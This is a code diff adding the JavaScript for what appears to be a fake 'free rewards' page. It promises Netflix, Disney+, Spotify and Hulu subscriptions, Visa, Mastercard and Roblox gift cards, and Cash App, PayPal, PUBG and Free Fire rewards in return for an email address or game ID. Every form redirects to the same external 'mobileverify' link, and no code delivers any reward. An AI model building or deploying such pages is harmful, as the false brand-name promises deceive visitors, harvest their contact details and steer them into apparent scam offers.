+      // Show the description and email input section
+      document.getElementById('descriptionAndEmail').style.display = 'block';
+
+      // Set dynamic description based on the service clicked
+      const descriptions = {
+        'Netflix': 'Enter your email to claim a Netflix subscription! Your account details will be sent soon.',
+        'Roblox': 'Enter your email to claim a Roblox gift card! Build and play in virtual worlds.',
+        'Visa': 'Enter your email to claim a Visa gift card! Spend it anywhere Visa is accepted.',
+        'Mastercard': 'Enter your email to claim a Mastercard gift card! Use it anywhere Mastercard is accepted.',
+        'Disney+': 'Enter your email to claim a Disney+ subscription! Watch movies and shows.',
+        'Starbucks': 'Enter your email to claim a Starbucks gift card! Enjoy your favorite coffee.',
+        'Hulu': 'Enter your email to claim a Hulu subscription! Stream your favorite shows.',
+        'Cash App': 'Enter your email to claim a Cash App reward! Send and receive money easily (USA only).',
+        'Spotify': 'Enter your email to claim a Spotify Premium subscription! Enjoy ad-free music.',
+        'PUBG': 'Enter your PUBG ID to claim your reward!',
+        'Free Fire': 'Enter your Free Fire ID to claim your reward!',
+        'PayPal': 'Enter your email to claim a PayPal reward! Receive your funds instantly.'
+      };
+
+      document.getElementById('serviceDescription').innerText = descriptions[service];
+    }
+
+    function showPubgForm() {
+      // Hide the service icons grid and other forms
+      document.getElementById('serviceSelection').style.display = 'none';
+      document.getElementById('descriptionAndEmail').style.display = 'none';
+      document.getElementById('freeFireForm').style.display = 'none';
+
+      // Show the PUBG ID form
+      document.getElementById('pubgForm').style.display = 'block';
+    }
+
+    function showFreeFireForm() {
+      // Hide the service icons grid and other forms
+      document.getElementById('serviceSelection').style.display = 'none';
+      document.getElementById('descriptionAndEmail').style.display = 'none';
+      document.getElementById('pubgForm').style.display = 'none';
+
+      // Show the Free Fire ID form
+      document.getElementById('freeFireForm').style.display = 'block';
+    }
+
+    function handlePubgRedirect() {
+      const pubgId = document.getElementById('pubgIdInput').value;
+      if (!pubgId) {
+        alert('Please enter a valid PUBG ID!');
+        return;
+      }
+      alert(`PUBG ID submitted: ${pubgId}. Redirecting to claim your reward!`);
+      window.location.href = 'https://mobileverify.net/cl/v/6d4w7m';
+    }
+
+    function handleFreeFireRedirect() {
+      const freeFireId = document.getElementById('freeFireIdInput').value;
+      if (!freeFireId) {
+        alert('Please enter a valid Free Fire ID!');
+        return;
+      }
+      alert(`Free Fire ID submitted: ${freeFireId}. Redirecting to claim your reward!`);
+      window.location.href = 'https://mobileverify.net/cl/v/6d4w7m';
+    }
+
+    function backToSelection() {
+      // Hide the description and email input section and other forms
+      document.getElementById('descriptionAndEmail').style.display = 'none';
+      document.getElementById('pubgForm').style.display = 'none';
+      document.getElementById('freeFireForm').style.display = 'none';
+
+      // Show the service icons grid
+      document.getElementById('serviceSelection').style.display = 'grid';
+
+      // Clear inputs
+      document.getElementById('emailInput').value = '';
+      document.getElementById('pubgIdInput').value = '';
+      document.getElementById('freeFireIdInput').value = '';
+    }
+
+    function handleRedirect() {
+      const email = document.getElementById('emailInput').value;
+      if (!email) {
+        alert('Please enter a valid email address!');
+        return;
+      }
+      alert(`Email submitted: ${email}. Redirecting to claim your reward!`);
+      window.location.href = 'https://mobileverify.net/cl/v/6d4w7m';
+    }
+  </script>
 </body>
 </html>
